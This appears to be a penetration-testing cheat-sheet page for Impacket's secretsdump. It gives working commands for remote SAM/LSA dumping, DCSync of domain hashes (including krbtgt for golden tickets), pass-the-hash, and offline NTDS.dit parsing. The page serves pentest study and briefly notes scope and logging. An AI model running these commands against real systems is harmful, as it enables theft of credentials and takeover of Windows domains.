---
tool: secretsdump
slug: secretsdump
kind: tool
stages: [post-compromise]
targets: [windows]
category: Impacket credential dumping
platforms: [linux]
services: [smb]
ports: [445]
tags: [impacket, secretsdump, ntds, dcsync, sam, lsa, dpapi, dumping, pass-the-hash]
attack: [T1003.002, T1003.003, T1003.006]
summary: Impacket's one-stop credential dumper. Pull the local SAM and LSA secrets, DCSync the domain hashes from a DC, or parse saved registry hives and NTDS.dit offline. The Linux counterpart to running Mimikatz on the box, and the usual source of the hashes you then crack or pass.
references:
  - Impacket | https://github.com/fortra/impacket
  - The Hacker Recipes: credential dumping | https://www.thehacker.recipes/ad/movement/credentials/dumping/
---

## When to reach for it

With local-admin or domain credentials (or a hash), to get hashes without touching Mimikatz on the target. This is the command reference for the dump; crack what you pull with Hashcat or John, and reuse it with the credential-access tools here.

## Remote: local SAM and LSA

```bash
secretsdump.py 'DOMAIN/user:pass@TARGET'                 # SAM + LSA secrets + cached creds
secretsdump.py -hashes :NTHASH 'administrator@TARGET'    # with a hash instead of a password
```

## DCSync: domain hashes from a Domain Controller

```bash
secretsdump.py 'DOMAIN/user:pass@DC' -just-dc-ntlm       # just the NT hashes, DRSUAPI
secretsdump.py 'DOMAIN/user:pass@DC' -just-dc-user krbtgt # one account (e.g. for a golden ticket)
secretsdump.py -k -no-pass 'DOMAIN/DC01$@DC' -just-dc    # with a Kerberos ticket (Pass-the-Certificate)
```

## Offline: saved hives or NTDS.dit

```bash
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
secretsdump.py -ntds ntds.dit -system system.save LOCAL  # the whole domain, from copied files
```

## Notes

Output is `uid:rid:lmhash:nthash`; copy the NT hash (fourth field) to crack or pass. DCSync and NTDS extraction pull every domain hash including `krbtgt` and the machine accounts, so they are high-impact and logged (4662 / replication events) — run only in scope, dump to your own machine, and handle the hashes as the sensitive loot they are. Related Impacket tools: `secretsdump` for creds, `psexec`/`wmiexec` for execution; see the [Impacket note](/cpts/#tool-impacket).
